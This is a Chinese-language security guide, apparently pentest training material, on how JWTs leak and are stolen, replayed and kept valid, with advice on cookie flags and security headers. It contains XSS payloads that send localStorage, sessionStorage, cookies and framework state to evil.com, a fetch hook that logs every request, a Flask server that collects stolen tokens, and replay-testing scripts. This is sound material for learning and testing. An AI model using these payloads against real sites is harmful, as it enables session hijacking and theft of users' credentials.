# JWT 窃取、重放与持久化

## 原理

JWT 是 Bearer Token — **持有即能用**，服务端不验证持有者身份，也不维护 Token 状态。这意味着一旦 Token 泄露，攻击者在有效期内可无限使用。

```
┌──────────────────────────────────────────────────────────┐
│ JWT 泄露途径全景                                          │
│                                                           │
│  客户端                                                     │
│    ├─ XSS → localStorage / sessionStorage / JS 变量      │
│    ├─ CSRF → cookie（非 SameSite）自动附带                 │
│    ├─ 浏览器历史记录 → URL 中的 token=                     │
│    ├─ 浏览器扩展 / 恶意插件                                │
│                                                           │
│  网络层                                                   │
│    ├─ HTTP 明文传输 → 中间人截获                            │
│    ├─ Referer 头 → 跨域请求泄露完整 URL                    │
│    ├─ 代理/CDN 日志 → URL 中的 token                      │
│                                                           │
│  服务端                                                   │
│    ├─ 应用日志 → 记录 Authorization header                 │
│    ├─ 错误报告 → Sentry/日志聚合含完整请求                  │
│    ├─ 数据库泄露 → Refresh Token 存储                      │
│                                                           │
│  移动端                                                   │
│    ├─ 备份提取 → iTunes/Android Backup                    │
│    ├─ 反编译 → 硬编码 Token                                │
│    ├─ 剪贴板 → 复制粘贴的 Token                            │
│                                                           │
│  开发运维                                                  │
│    ├─ Postman 导出 → 团队共享                               │
│    ├─ CI/CD 环境变量 → 构建日志                            │
│    ├─ Git 仓库 → 硬编码 Token/Secret                      │
└──────────────────────────────────────────────────────────┘
```

---

## 1. XSS 窃取 Token

### 存储策略与安全

```javascript
// ❌ 不安全: localStorage — 对 XSS 完全暴露
localStorage.setItem('token', jwt);
// 攻击者 XSS payload:
// fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))

// ❌ 不安全: sessionStorage — 同样对 XSS 暴露
sessionStorage.setItem('token', jwt);

// ❌ 不安全: 非 HttpOnly Cookie — JS 可读取
document.cookie = "token=" + jwt + "; path=/";
// 攻击者: fetch('https://evil.com/steal?c=' + document.cookie)

// ✅ 较安全: HttpOnly + Secure + SameSite Cookie
// 服务端设置: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
// JS 无法读取，仅自动附带在同站请求中
// 但 CSRF 仍需防范
```

### 伪代码：XSS Token 窃取

```python
# 攻击者端：接收窃取的 Token
from flask import Flask, request

app = Flask(__name__)
stolen_tokens = []

@app.route('/steal')
def steal():
    token = request.args.get('t', '') or request.args.get('c', '')
    stolen_tokens.append({
        'token': token,
        'ip': request.remote_addr,
        'ua': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer'),
        'time': time.time()
    })
    return '', 204  # 不引起注意

@app.route('/tokens')
def list_tokens():
    return {"count": len(stolen_tokens), "tokens": stolen_tokens}
```

### XSS Payloads 针对 Token 存储

```javascript
// 通用: 窃取所有存储
fetch('//evil.com/s', {method:'POST', body:JSON.stringify({
  local: {...localStorage},
  session: {...sessionStorage},
  cookie: document.cookie
})})

// 针对常见 JS 框架状态
// React / Redux
fetch('//evil.com/s?r=' + JSON.stringify(window.__REDUX_STORE__))

// Vue / Vuex
fetch('//evil.com/s?v=' + JSON.stringify(window.__VUEX_STORE__))

// Angular
fetch('//evil.com/s?a=' + angular.element(document.body).injector().get('AuthService').token)

// 通用: Hook fetch/XHR 捕获所有请求
const origFetch = window.fetch
window.fetch = function(...args) {
  fetch('//evil.com/log', {method:'POST', body:JSON.stringify({
    url: args[0], headers: args[1]?.headers
  })})
  return origFetch.apply(this, args)
}
```

---

## 2. URL Token 泄露

### 漏洞场景

```
GET /api/callback?token=eyJhbGciOiJIUz...&redirect=/dashboard
GET /reset-password?token=eyJhbGciOiJIUz...
GET /verify-email?token=eyJhbGciOiJIUz...
```

### 泄露途径

```python
# 1. Referer 头泄露
# 场景: https://app.com/callback?token=xxx 中有 <img src="https://evil.com/pixel">
# 请求 evil.com/pixel 时 Referer = https://app.com/callback?token=xxx
# 攻击者分析 evil.com 的访问日志即可提取 token

# 2. 浏览器历史
# URL 中的 token 保留在 history API 和地址栏中
# window.location.href → 包含完整 token

# 3. 服务端日志
# GET /api/callback?token=xxx HTTP/1.1 → access.log
# 日志可能被聚合到 ELK/Splunk，权限更低的人也能看到

# 4. CDN / 代理日志
# CDN 通常记录完整 URL
```

### 检查手段

```bash
# 搜索 JS 源码中通过 URL 传递 token 的模式
grep -rPn "(token|jwt|access_token|id_token|auth)" --include="*.js" .

# 检查是否有 history.replaceState 清洗 URL
# 如果没有 → 浏览器历史中存在明文 token

# 检查 Referrer-Policy
curl -I https://target.com | grep -i referrer-policy
# 期望: Referrer-Policy: strict-origin 或 no-referrer
# 缺失时 → Referer 泄露风险
```

---

## 3. 明文传输窃取

```bash
# 检查 HTTPS 强制
curl -I http://target.com/login   # 是否有 301 → https?
curl -I http://api.target.com/    # API 是否允许 HTTP?

# 检查 HSTS 头
curl -I https://target.com | grep -i strict-transport-security
# 期望: Strict-Transport-Security: max-age=31536000; includeSubDomains
# 缺失时 → SSLStrip 攻击可能

# 检查 Cookie 的 Secure 标志
# Set-Cookie: token=xxx; Secure; HttpOnly; SameSite=Strict
```

---

## 4. Token 重放 & 无法撤销

### 伪代码：重放检测

```python
# 攻击: 用同一个合法 Token（未修改）发起多次请求
# 如果服务端没有 jti 检查或黑名单机制 → 可无限重放

def test_replay_protection(target_url: str, token: str, count: int = 100):
    """
    用同一个 Token 发起大量请求，测试是否有重放检测
    """
    results = []
    for i in range(count):
        resp = requests.get(target_url,
            headers={"Authorization": f"Bearer {token}"})
        results.append(resp.status_code)
        if resp.status_code in (429, 401, 403):
            print(f"[i] Rate limited or rejected at request {i}")
            break
    return results

def test_logout_revocation(logout_url: str, api_url: str, token: str):
    """
    测试登出后 Token 是否仍有效
    """
    # 先验证 token 有效
    resp_before = requests.get(api_url,
        headers={"Authorization": f"Bearer {token}"})
    assert resp_before.status_code == 200, "Token invalid before logout"

    # 登出
    requests.post(logout_url,
        headers={"Authorization": f"Bearer {token}"})

    # 再测试 token
    resp_after = requests.get(api_url,
        headers={"Authorization": f"Bearer {token}"})
    if resp_after.status_code == 200:
        print("[!] Token still valid after logout! (no revocation)")
    else:
        print("[+] Token revoked successfully")
```

---

## 检测信号

- Token 在 URL query string 中 → 直接可窃取
- `Set-Cookie` 缺少 `HttpOnly` → JS 可读
- `Set-Cookie` 缺少 `Secure` → HTTP 可截获
- `Set-Cookie` 缺少 `SameSite` → CSRF 可触发
- 缺少 `Referrer-Policy` 头 → 跨域 Referer 泄露
- 缺少 HSTS → SSLStrip 可能
- `exp - iat > 86400` (24h) → 泄露窗口过大
- 登出后 Token 仍能用 → 无撤销机制

## 工具命令

```bash
# 检查 Cookie 属性
curl -v https://target.com/api/login -X POST -d '...' 2>&1 | grep -i set-cookie

# 检查安全头
curl -I https://target.com | grep -iE "(strict-transport|referrer-policy|content-security)"

# 检查 CORS（可能允许跨域读取响应中的 Token）
curl -H "Origin: https://evil.com" https://target.com/api/me -I | grep -i access-control

# 用 jwt_tool 修改 exp
python3 jwt_tool.py <token> -I -pc "exp" -pv "$(date -d '+30 days' +%s)"
```
